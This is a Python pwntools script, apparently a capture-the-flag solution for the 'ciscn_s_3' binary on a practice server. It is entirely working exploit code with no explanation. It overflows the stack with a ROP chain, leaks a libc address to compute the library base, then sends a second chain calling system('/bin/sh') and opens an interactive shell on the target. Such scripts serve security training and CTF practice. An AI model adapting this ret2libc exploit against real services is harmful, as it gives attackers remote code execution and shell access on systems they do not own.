import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./ciscn_s_3')
		elf=ELF('./ciscn_s_3')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28252)
		elf=ELF('./ciscn_s_3')
		libc=ELF('./libc.so')


	p4_r=0x000000000040059c
	bss=0x000000000601030
	syscall_ret=0x000000000400517
	make_call=0x0000000000400580
	pop_rbp=0x0000000000400440
	fun=0x0000000004004ED
	add_sp_8=0x0000000004005B8
	write_addr=0x000000000400503
	pop_rdi=0x00000000004005a3
	pay='\x00'*0x10+p64(add_sp_8)+p64(0)+p64(write_addr)+p64(0x0000000004004F1)
	
	#gdb.attach(io)
	#pause()
	io.send(pay)
	io.recv(0x30)
	libc.address=u64(io.recv()[0x20:0x28])-libc.sym['__libc_start_main']-240+9
	success('libc_base:'+hex(libc.address))
	pay='\x00'*0x10+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])
	
	io.send(pay)
	#io.recv()
	io.interactive()